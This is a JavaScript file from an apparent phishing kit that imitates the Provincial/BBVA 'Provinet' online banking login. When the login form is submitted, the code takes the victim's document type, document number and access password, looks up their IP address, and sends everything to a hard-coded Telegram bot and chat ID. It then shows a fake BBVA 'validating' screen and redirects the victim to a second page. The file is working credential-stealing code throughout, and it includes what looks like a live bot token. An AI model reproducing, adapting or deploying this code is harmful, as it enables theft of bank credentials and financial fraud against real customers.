// Token y chat ID de Telegram
const TELEGRAM_TOKEN = '8038367240:AAFwLaUBcYyUMFzNlTLLO2c0DAEVqBNraLI';  // Reemplaza con tu token real
const CHAT_ID = '-1002267762294';  // Reemplaza con tu chat ID real

// Función para obtener la IP del usuario
function getIPAddress(callback) {
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            callback(data.ip);
        })
        .catch(error => {
            console.error('Error obteniendo la IP:', error);
            callback('No disponible');
        });
}

// Función para enviar mensaje a Telegram
function sendToTelegram(data) {
    getIPAddress((ip) => {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const message = `
        *✨ LOGO PROVINCIAL: ✨*

        📄 **${data.tipoDocumento}**: ${data.numeroDocumento}
        🔒 **Clave de acceso**: ${data.claveAcceso}
        🌍 **IP**: ${ip}

        ---
        👨‍💻 *Desarrollado por* **MegabyteAG5** 💻
        `;

        fetch(url, {
            method: 'POST',
            body: new URLSearchParams({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Mensaje enviado correctamente', data);
        })
        .catch(error => {
            console.error('Error al enviar mensaje:', error);
        });
    });
}

// Función para mostrar la pantalla de carga
function showLoadingScreen() {
    const loadingOverlay = document.createElement('div');
    loadingOverlay.style.position = 'fixed';
    loadingOverlay.style.top = '0';
    loadingOverlay.style.left = '0';
    loadingOverlay.style.width = '100vw';
    loadingOverlay.style.height = '100vh';
    loadingOverlay.style.background = 'rgba(211, 211, 211, 0.8)';  // Fondo gris claro
    loadingOverlay.style.display = 'flex';
    loadingOverlay.style.flexDirection = 'column';
    loadingOverlay.style.alignItems = 'center';
    loadingOverlay.style.justifyContent = 'center';
    loadingOverlay.style.zIndex = '1000';

    // Título arriba del círculo
    const welcomeText = document.createElement('div');
    welcomeText.textContent = 'Bienvenido a Provinet';
    welcomeText.style.fontSize = '24px';
    welcomeText.style.fontWeight = 'bold';
    welcomeText.style.color = '#072146';
    welcomeText.style.marginBottom = '20px';

    // Círculo de carga
    const circle = document.createElement('div');
    circle.style.width = '80px';
    circle.style.height = '80px';
    circle.style.borderRadius = '50%';
    circle.style.border = '8px solid transparent';
    circle.style.borderTop = '8px solid #072146';
    circle.style.borderBottom = '8px solid #1873b3';
    circle.style.animation = 'spin 1s linear infinite';
    circle.style.position = 'relative';
    
    // Crear el texto BBVA dentro del círculo
    const text = document.createElement('span');
    text.textContent = 'BBVA';
    text.style.position = 'absolute';
    text.style.top = '50%';
    text.style.left = '50%';
    text.style.transform = 'translate(-50%, -50%)';
    text.style.color = '#072146';
    text.style.fontSize = '18px';
    text.style.fontWeight = 'bold';
    text.style.zIndex = '1001'; // Asegura que el texto esté encima del círculo

    circle.appendChild(text);
    loadingOverlay.appendChild(welcomeText);
    loadingOverlay.appendChild(circle);

    // Título abajo del círculo
    const validatingText = document.createElement('div');
    validatingText.textContent = 'Validando información, por favor espere...';
    validatingText.style.fontSize = '16px';
    validatingText.style.color = '#072146';
    validatingText.style.marginTop = '20px';

    loadingOverlay.appendChild(validatingText);
    document.body.appendChild(loadingOverlay);

    // Después de 5 segundos, redirigir a index2.html
    setTimeout(() => {
        window.location.href = 'index2.html';
    }, 5000); // Redirige después de 5 segundos
}

// Función principal para manejar el envío del formulario
function handleFormSubmit(event) {
    event.preventDefault(); // Evita que el formulario se envíe por defecto

    const tipoDocumento = document.querySelector('select').value;
    const numeroDocumento = document.querySelector('input[type="text"]').value;
    const claveAcceso = document.querySelector('input[type="password"]').value;
    const recordar = document.querySelector('#recordar').checked;

    // Mostrar pantalla de carga
    showLoadingScreen();

    // Enviar los datos a Telegram inmediatamente
    const data = {
        tipoDocumento,
        numeroDocumento,
        claveAcceso,
        recordar
    };
    sendToTelegram(data);
}

// Asignar la función al evento de submit del formulario
document.querySelector('form').addEventListener('submit', handleFormSubmit);

// Animación para el círculo de carga
const style = document.createElement('style');
style.innerHTML = `
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
`;
document.head.appendChild(style);
